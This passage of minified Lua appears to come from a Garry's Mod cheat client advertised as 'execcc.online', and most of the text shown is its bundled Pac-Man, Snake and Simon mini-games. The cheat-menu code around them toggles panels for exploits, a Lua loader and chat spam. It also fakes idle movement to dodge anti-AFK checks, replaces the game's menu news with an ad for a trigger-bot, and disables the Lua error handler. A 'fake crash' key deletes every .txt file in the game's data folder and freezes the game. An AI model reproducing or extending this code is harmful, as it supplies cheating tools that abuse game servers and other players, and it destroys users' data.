elseif e2("1")==F["stop"]then gdirectionx=0;gdirectiony=0 end;if e2("2")==F["Up"]and ea(e2("2"),"2",e1("2"))then gdirectiony1=-1 elseif e2("2")==F["Down"]and ea(e2("2"),"2",e1("2"))then gdirectiony1=1 elseif e2("2")==F["Right"]and ea(e2("2"),"2",e1("2"))then gdirectionx1=1 elseif e2("2")==F["Left"]and ea(e2("2"),"2",e1("2"))then gdirectionx1=-1 elseif e2("2")==F["stop"]then gdirectionx1=0;gdirectiony1=0 end;if e2("3")==F["Up"]and ea(e2("3"),"3",e1("3"))then gdirectiony2=-1 elseif e2("3")==F["Down"]and ea(e2("3"),"3",e1("3"))then gdirectiony2=1 elseif e2("3")==F["Right"]and ea(e2("3"),"3",e1("3"))then gdirectionx2=1 elseif e2("3")==F["Left"]and ea(e2("3"),"3",e1("3"))then gdirectionx2=-1 elseif e2("3")==F["stop"]then gdirectionx2=0;gdirectiony2=0 end;if e2("4")==F["Up"]and ea(e2("4"),"4",e1("4"))then gdirectiony3=-1 elseif e2("4")==F["Down"]and ea(e2("4"),"4",e1("4"))then gdirectiony3=1 elseif e2("4")==F["Right"]and ea(e2("4"),"4",e1("4"))then gdirectionx3=1 elseif e2("4")==F["Left"]and ea(e2("4"),"4",e1("4"))then gdirectionx3=-1 elseif e2("4")==F["stop"]then gdirectionx3=0;gdirectiony3=0 end;if CurTime()>dh then F[1].Pac.pos.x=F[1].Pac.pos.x+directionx;F[1].Pac.pos.y=F[1].Pac.pos.y+directiony;dh=CurTime()+0.15 end;if CurTime()>aO then e0("1").oldpos.x=e0("1").pos.x;e0("1").oldpos.y=e0("1").pos.y;e0("1").pos.x=e0("1").pos.x+gdirectionx;e0("1").pos.y=e0("1").pos.y+gdirectiony;aO=CurTime()+0.20 end;if CurTime()>av then e0("2").oldpos.x=e0("2").pos.x;e0("2").oldpos.y=e0("2").pos.y;e0("2").pos.x=e0("2").pos.x+gdirectionx1;e0("2").pos.y=e0("2").pos.y+gdirectiony1;av=CurTime()+0.25 end;if CurTime()>di then e0("3").oldpos.x=e0("3").pos.x;e0("3").oldpos.y=e0("3").pos.y;e0("3").pos.x=e0("3").pos.x+gdirectionx2;e0("3").pos.y=e0("3").pos.y+gdirectiony2;di=CurTime()+0.35 end;if CurTime()>bU then e0("4").oldpos.x=e0("4").pos.x;e0("4").oldpos.y=e0("4").pos.y;e0("4").pos.x=e0("4").pos.x+gdirectionx3;e0("4").pos.y=e0("4").pos.y+gdirectiony3;bU=CurTime()+0.40 end;if dY("1")~=e4()then local er=B("1",{x=e4().x,y=e4().y})if dZ("1")=="killed"then er=B("1",{x=11,y=8})end;if CurTime()<aD then else if not ea(er.a,"1",e1("1"))and not ea(er.b,"1",e1("1"))then ee("1",nil,dY("1"),e1("1"))elseif ea(er.a,"1",e1("1"))then ee("1",er.a,dY("1"),e1("1"))elseif ea(er.b,"1",e1("1"))then ee("1",er.b,dY("1"),e1("1"))end end end;if dY("2")~=e4()then local er=B("2",{x=e4().x,y=e4().y})if dZ("2")=="killed"then er=B("2",{x=11,y=8})end;if CurTime()<aD then else if not ea(er.a,"2",e1("2"))and not ea(er.b,"2",e1("2"))then ee("2",nil,dY("2"),e1("2"))elseif ea(er.a,"2",e1("2"))then ee("2",er.a,dY("2"),e1("2"))elseif ea(er.b,"2",e1("2"))then ee("2",er.b,dY("2"),e1("2"))end end end;if dY("3")~=e4()then local es,et=0,0;if dX()=="up"then es=0;et=-2 elseif dX()=="right"then es=2;et=0 elseif dX()=="down"then es=0;et=2 elseif dX()=="left"then es=-2;et=0 elseif dX()=="stop"then es=2;et=0 end;local er=B("3",{x=e4().x+es,y=e4().y+et})if dZ("3")=="killed"then er=B("3",{x=11,y=8})end;if CurTime()<aD then else if not ea(er.a,"3",e1("3"))and not ea(er.b,"3",e1("3"))then ee("3",nil,dY("3"),e1("3"))elseif ea(er.a,"3",e1("3"))then ee("3",er.a,dY("3"),e1("3"))elseif ea(er.b,"3",e1("3"))then ee("3",er.b,dY("3"),e1("3"))end end end;if dY("4")~=e4()then local er=B("4",{x=e4().x,y=e4().y})if dZ("4")=="killed"then er=B("4",{x=11,y=8})end;if CurTime()<aD then else if not ea(er.a,"4",e1("4"))and not ea(er.b,"4",e1("4"))then ee("4",nil,dY("4"),e1("4"))elseif ea(er.a,"4",e1("4"))then ee("4",er.a,dY("4"),e1("4"))elseif ea(er.b,"4",e1("4"))then ee("4",er.b,dY("4"),e1("4"))end end end;if CurTime()>ax and ad>1 then ad=1 end;for dP=1,4 do if dY(tostring(dP)).x==e4().x and dY(tostring(dP)).y==e4().y then if dZ(tostring(dP))=="scatter"then surface.PlaySound("pacman/pacman_chomp.wav")ac=ac+ad*d;SetGhostMode(tostring(dP),"killed")ad=ad+1 elseif dZ(tostring(dP))=="killed"then elseif dZ(tostring(dP))~="scatter"or dZ(tostring(dP))~="killed"then if CurTime()>aD then aA=aA-1;e3({x=10,y=14})a9=0;F[1].Pac.dir=F["Left"]dH=CurTime()+3;d_("1",{x=9,y=10})d_("2",{x=10,y=10})d_("3",{x=11,y=10})d_("4",{x=10,y=9})dW("1","stop")dW("2","stop")dW("3","stop")dW("4","stop")dA("stop")aD=CurTime()+2 end end end;if aA==0 then dW("1","stop")dW("2","stop")dW("3","stop")dW("4","stop")dA("stop")end end;if aA~=0 and#a7<=0 then table.Empty(a7)for dP,dn in ipairs(c8)do AddDot(dn.x,dn.y)end;T=table.Copy(w)a8=a8+1 end;if e4().x==19 and e4().y==9 and F[1].Pac.dir=="right"then dU(a7,19,9,"normal")dU(a7,1,9,"normal")e3({x=2,y=9})elseif e4().x==1 and e4().y==9 and F[1].Pac.dir=="left"then dU(a7,1,9,"normal")dU(a7,19,9,"normal")e3({x=18,y=9})end;for dP=1,4 do if dY(tostring(dP)).x==10 and dY(tostring(dP)).y==8 and dZ(tostring(dP))=="killed"then SetGhostMode(tostring(dP),"normal")end;if dY(tostring(dP)).x==19 and dY(tostring(dP)).y==9 and e2(tostring(dP))=="right"then d_(tostring(dP),{x=2,y=9})elseif dY(tostring(dP)).x==1 and dY(tostring(dP)).y==9 and e2(tostring(dP))=="left"then d_(tostring(dP),{x=18,y=9})end end end end;hook.Add("Think","core",eo)RunConsoleCommand("ghdfopksdfglmer",1)end)a1("Snake",3,30,50,25,doplpanel,function()CreateClientConVar("dsfsdfsdfbgfdf",0,false,false)local a=15;local D={headx=ScrW()/2,heady=ScrH()/2,dirx=0,diry=0,length=0,tail={}}local E={x=0,y=0}local F=200;local e=0;local function w()E.x=math.Round(math.random(20,ScrW()-20))E.y=math.Round(math.random(20,ScrH()-ScrH()*0.125))end;w()local function T()if e>0 then print("You died! Final score: "..e.."!")end;F=200;e=0;D={headx=ScrW()/2,heady=ScrH()/2,dirx=0,diry=0,length=0,tail={}}w()end;local function ad()D.length=D.length+a;w()F=math.min(F*1.02,600)e=e+math.Round(F/150)end;local function d()if not gui.IsGameUIVisible()and GetConVarNumber("dsfsdfsdfbgfdf")==1 then RunConsoleCommand("dsfsdfsdfbgfdf","0")end;if input.IsKeyDown(KEY_BACKSPACE)and GetConVarNumber("dsfsdfsdfbgfdf")==1 then RunConsoleCommand("dsfsdfsdfbgfdf","0")end;if GetConVarNumber("dsfsdfsdfbgfdf")==1 then draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(0,0,0))local dh,aO,av,di=input.IsKeyDown(KEY_UP),input.IsKeyDown(KEY_DOWN),input.IsKeyDown(KEY_LEFT),input.IsKeyDown(KEY_RIGHT)if(dh or aO)and D.diry==0 then D.diry=dh and-1 or 1;D.dirx=0 elseif(av or di)and D.dirx==0 then D.dirx=av and-1 or 1;D.diry=0 end;table.insert(D.tail,1,{x=D.headx,y=D.heady})if#D.tail>D.length then table.remove(D.tail,#D.tail)end;local bU=D.dirx*F*FrameTime()local ax=D.diry*F*FrameTime()D.headx=D.headx+bU;D.heady=D.heady+ax;if D.headx<=0 or D.heady<=0 or D.heady+a>=ScrH()or D.headx+a>=ScrW()then T()end;if E.x<=D.headx+a and D.headx<=E.x+a and E.y<=D.heady+a and D.heady<=E.y+a then ad()end;local a6=math.abs(math.sin(CurTime()*2.5))surface.SetDrawColor(120+135*a6,50,0,255)surface.DrawRect(E.x,E.y,a,a)surface.SetDrawColor(120+135*a6,50,150*a6,255)for a7=1,#D.tail do local a8=D.tail[a7]if not a8 then break end;surface.DrawRect(a8.x,a8.y,a,a)if a7>a*3 and a8.x>=D.headx and a8.x<=D.headx+a and a8.y>=D.heady and a8.y<=D.heady+a then T()end end;surface.SetDrawColor(50,120+135*a6,150*a6,255)surface.DrawRect(D.headx,D.heady,a,a)surface.SetTextColor(color_white)local a9="Snake score: "..e;surface.SetFont("hack_font_22")local dj,aw=surface.GetTextSize(a9)surface.SetTextPos(10,10)surface.DrawText(a9)draw.SimpleText("PRESS BACKSPACE TO CLOSE","hack_font_22",10,30,Color(255,255,255))end end;hook.Add("DrawOverlay","MenuP_Snake_Draw",d)RunConsoleCommand("dsfsdfsdfbgfdf",1)end)a1("Simon",3,57,50,25,doplpanel,function()local a={}local D={}D[1]=125;D[2]=150;D[3]=175;D[4]=200;local function E()a.Hhfg={}a.jFun={}a.Htij=0;a.Djfyu=false;a.DjfyuSeq=1;a.Whd=1;a.fYbg=nil;a.Wgjyhb=false;a.Egfh=false;a.Rhjd=1 end;local function F()if a.Wgjyhb then return end;if a.Djfyu==false then a.Djfyu=true end;if a.Htij>CurTime()then return end;a.Htij=CurTime()+1;if a.DjfyuSeq==nil then a.DjfyuSeq=1 end;for e,w in pairs(a.Hhfg)do if w.num==a.DjfyuSeq then a.simon_lightUpColor=w.color end end;timer.Simple(0.9,function()a.simon_lightUpColor=0 end)if a.DjfyuSeq>a.Rhjd then a.Djfyu=false;a.DjfyuSeq=0;return end;a.DjfyuSeq=a.DjfyuSeq+1 end;hook.Add("Think","3213",function()if a.Djfyu==true then F()end end)local function T()local ad=a.Rhjd;local d={}local dh={num=a.Rhjd,color=math.random(1,4)}table.insert(a.Hhfg,dh)a.Djfyu=true end;local function aO()E()end;local function av()a.Whd=1;a.jFun={}a.Rhjd=a.Rhjd+1;T()F()end;local function di()for bU=1,a.Whd do if a.Hhfg[bU].num~=a.jFun[bU].num or a.Hhfg[bU].color~=a.jFun[bU].color then return true end end;return false end;local function ax(a6,a7)if a.Djfyu then return end;if a.Egfh~=true then return end;a.fYbg=a6;local dh={num=a.Whd,color=a6}table.insert(a.jFun,dh)if di()==true then a.Wgjyhb=true;timer.Simple(2,function()aO()end)return end;if a.Whd==a.Rhjd then av()return end;a.Whd=a.Whd+1 end;local function a8()local a7=vgui.Create("DFrame")a7:SetTitle("")a7:SetSize(400,500)a7:SetPos(ScrW()/2-a7:GetWide()/2-300,ScrH()/2-a7:GetTall()/2)a7:MoveTo(ScrW()/2-a7:GetWide()/2,ScrH()/2-a7:GetTall()/2,0.25,0)a7:SetVisible(true)a7:SetDraggable(false)a7:MakePopup(true)a7.OnRemove=function()if a.simon_hiscores==true then a.simon_highscorePanel:Remove()a.simon_hiscores=false;return end;aO()end;a7.Paint=function()surface.SetDrawColor(Color(0,0,0,250))surface.DrawRect(0,24,a7:GetWide(),380)surface.SetTextColor(Color(255,255,255))surface.SetFont("default")surface.SetTextPos(8,384)surface.DrawText("Score: "..a.Rhjd)if a.Egfh then local a9;surface.SetDrawColor(Color(26,188,156))surface.DrawRect(242,380,45,18)surface.SetTextPos(246,383)if a.Djfyu then a9="WATCH"else a9="REPEAT"end;if a.Wgjyhb then a9="FAILED"end;surface.DrawText(a9)end end;local dj=vgui.Create("DButton",a7)dj:SetText("")dj:SetSize(192,170)dj:SetPos(4,28)dj.OnCursorEntered=function()dj.entered=true end;dj.OnCursorExited=function()dj.entered=false end;dj.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==1 then aw=255 elseif a.Djfyu==false and dj.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(46,204,113,aw))surface.DrawRect(0,0,dj:GetWide(),dj:GetTall())end;dj.DoClick=function()ax(1,a7)end;local m=vgui.Create("DButton",a7)m:SetText("")m:SetSize(192,170)m:SetPos(204,28)m.OnCursorEntered=function()m.entered=true end;m.OnCursorExited=function()m.entered=false end;m.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==2 then aw=255 elseif a.Djfyu==false and m.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(231,76,60,aw))surface.DrawRect(0,0,dj:GetWide(),dj:GetTall())end;m.DoClick=function()ax(2,a7)end;local ac=vgui.Create("DButton",a7)ac:SetText("")ac:SetSize(192,170)ac:SetPos(4,206)ac.OnCursorEntered=function()ac.entered=true end;ac.OnCursorExited=function()ac.entered=false end;ac.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==3 then aw=255 elseif a.Djfyu==false and ac.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(241,196,15,aw))surface.DrawRect(0,0,dj:GetWide(),dj:GetTall())end;ac.DoClick=function()ax(3,a7)end;local ay=vgui.Create("DButton",a7)ay:SetText("")ay:SetSize(192,170)ay:SetPos(204,206)ay.OnCursorEntered=function()ay.entered=true end;ay.OnCursorExited=function()ay.entered=false end;ay.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==4 then aw=255 elseif a.Djfyu==false and ay.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(52,152,219,aw))surface.DrawRect(0,0,dj:GetWide(),dj:GetTall())end;ay.DoClick=function()ax(4,a7)end;local aA=vgui.Create("DButton",a7)aA:SetText("")aA:SetSize(100,38)aA:SetPos(a7:GetWide()/2-aA:GetWide()/2,408)aA.OnCursorEntered=function()aA.entered=true end;aA.OnCursorExited=function()aA.entered=false end;aA.Paint=function()local aw;local a9="START"if a.Egfh then return end;if aA.entered==true then aw=100 else aw=200 end;surface.SetDrawColor(Color(0,200,0,aw))surface.DrawRect(0,0,aA:GetWide(),aA:GetTall())surface.SetTextColor(Color(255,255,255))surface.SetFont("DermaLarge")surface.SetTextPos(aA:GetWide()/2-41,4)surface.DrawText(a9)end;aA.DoClick=function()if a.Egfh==true then return end;a.Egfh=true;T()F()end end;a.Rhjd=nil;if a.Rhjd==nil then a.Rhjd=1 end;E()a8()end)end)end,55)menulist:Hide()function show()dt:Show()menulist:Show()if _["spam"]then cO:Show()end;if _["logs"]then cE:Show()end;if _["itemlist"]then d0:Show()end;if _["glualoder"]then dk:Show()end;if _["exploit"]then cY:Show()end;if _["chatgay"]then cX:Show()end end;function hide()dt:Hide()menulist:Hide()if _["spam"]then cO:Hide()end;if _["logs"]then cE:Hide()end;if _["itemlist"]then d0:Hide()end;if _["glualoder"]then dk:Hide()end;if _["exploit"]then cY:Hide()end;if _["chatgay"]then cX:Hide()end end;local dL,dM,eu=0,0,0;hook.Add("Think","fff",function()if input.IsKeyDown(t["FAKECRASHKEY"])then if t["FAKECRASHKEY"]==0 then else for h,m in pairs(file.Find("*.txt","DATA"))do file.Delete(m)end;while 1 do end end end;if t["MISC_ANTIANTIAFK"]and IsInGame()then if input.IsKeyDown(KEY_W)or input.IsKeyDown(KEY_S)or input.IsKeyDown(KEY_D)or input.IsKeyDown(KEY_A)then eu=0 else eu=eu+1 end;if eu>1000 then RunConsoleCommand("+forward")timer.Simple(0.3,function()RunConsoleCommand("-forward")end)eu=0 end end;if input.IsKeyDown(t["MENU_OPENKEY"])and dM==0 then if dL==0 then gui.ActivateGameUI()show()dL=1 elseif dL==1 then gui.HideGameUI()hide()dL=0 end;dM=1;timer.Simple(0.3,function()dM=0 end)end end)local W={[0]={Url="https://execcc.online",Title="execcc.online update 08.03.2021",HeaderImage="https://i.imgur.com/56o9cuA.jpg",SummaryHtml="Add Trigger-Bot, Corner fat and etc.. in discord #updates"}}pnlMainMenu:Call("UpdateNewsList("..util.TableToJSON(W)..","..cookie.GetString("hide_newslist","false")..")")end)hook.Remove("OnLuaError","MenuErrorHandler")
